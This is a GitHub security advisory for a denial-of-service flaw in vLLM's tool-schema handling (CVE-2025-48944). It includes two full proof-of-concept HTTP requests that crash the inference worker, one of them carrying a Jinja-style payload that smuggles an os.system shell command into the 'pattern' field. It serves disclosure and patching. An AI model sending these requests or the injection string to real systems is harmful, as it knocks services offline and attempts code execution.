# [M] vLLM Tool Schema allows DoS via Malformed pattern and type Fields

## Summary
Severity: Medium
Advisory: GHSA-vrq3-r879-7m65
CVE: CVE-2025-48944
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-05-28
Source: https://github.com/advisories/GHSA-vrq3-r879-7m65
Type: github-advisory

## Affected
- PyPI: `vllm` — affected >=0.8.0 <0.9.0

## Details
### Summary
The vLLM backend used with the /v1/chat/completions OpenAPI endpoint fails to validate unexpected or malformed input in the "pattern" and "type" fields when the tools functionality is invoked. These inputs are not validated before being compiled or parsed, causing a crash of the inference worker with a single request. The worker will remain down until it is restarted. 

### Details
The "type" field is expected to be one of: "string", "number", "object", "boolean", "array", or "null". Supplying any other value will cause the worker to crash with the following error:

RuntimeError: [11:03:34] /project/cpp/json_schema_converter.cc:637: Unsupported type "something_or_nothing"

The "pattern" field undergoes Jinja2 rendering (I think) prior to being passed unsafely into the native regex compiler without validation or escaping. This allows malformed expressions to reach the underlying C++ regex engine, resulting in fatal errors.

For example, the following inputs will crash the worker:

Unclosed {, [, or (

Closed:{} and []

Here are some of runtime errors on the crash depending on what gets injected:

RuntimeError: [12:05:04] /project/cpp/regex_converter.cc:73: Regex parsing error at position 4: The parenthesis is not closed.
RuntimeError: [10:52:27] /project/cpp/regex_converter.cc:73: Regex parsing error at position 2: Invalid repetition count.
RuntimeError: [12:07:18] /project/cpp/regex_converter.cc:73: Regex parsing error at position 6: Two consecutive repetition modifiers are not allowed.

### PoC
Here is the POST request using the type field to crash the worker. Note the type field is set to "something" rather than the expected types it is looking for:
POST /v1/chat/completions HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: 
Content-Type: application/json
Content-Length: 579
Origin: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{
  "model": "mistral-nemo-instruct",
  "messages": [{ "role": "user", "content": "crash via type" }],
  "tools": [
    {
      "type": "function",
      "function": {
        "name": "crash01",
        "parameters": {
          "type": "object",
          "properties": {
            "a": {
              "type": "something"
            }
          }
        }
      }
    }
  ],
  "tool_choice": {
    "type": "function",
    "function": {
      "name": "crash01",
      "arguments": { "a": "test" }
    }
  },
  "stream": false,
  "max_tokens": 1
}

Here is the POST request using the pattern field to crash the worker. Note the pattern field is set to a RCE payload, it could have just been set to {{}}. I was not able to get RCE in my testing, but is does crash the worker.

POST /v1/chat/completions HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: 
Content-Type: application/json
Content-Length: 718
Origin: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{
  "model": "mistral-nemo-instruct",
  "messages": [
    {
      "role": "user",
      "content": "Crash via Pattern"
    }
  ],
  "tools": [
    {
      "type": "function",
      "function": {
        "name": "crash02",
        "parameters": {
          "type": "object",
          "properties": {
            "a": {
              "type": "string",
"pattern": "{{ __import__('os').system('echo RCE_OK > /tmp/pwned') or 'SAFE' }}"
            }
          }
        }
      }
    }
  ],
  "tool_choice": {
    "type": "function",
    "function": {
      "name": "crash02"
    }
  },
  "stream": false,
  "max_tokens": 32,
  "temperature": 0.2,
  "top_p": 1,
  "n": 1
}

### Impact
Backend workers can be crashed causing anyone to using the inference engine to get 500 internal server errors on subsequent requests. 

### Fix

* https://github.com/vllm-project/vllm/pull/17623

## References
- https://github.com/vllm-project/vllm/security/advisories/GHSA-vrq3-r879-7m65
- https://nvd.nist.gov/vuln/detail/CVE-2025-48944
- https://github.com/vllm-project/vllm/pull/17623
- https://github.com/advisories/GHSA-vrq3-r879-7m65
- https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-2023.yaml
- https://github.com/vllm-project/vllm
- https://pypi.org/project/vllm
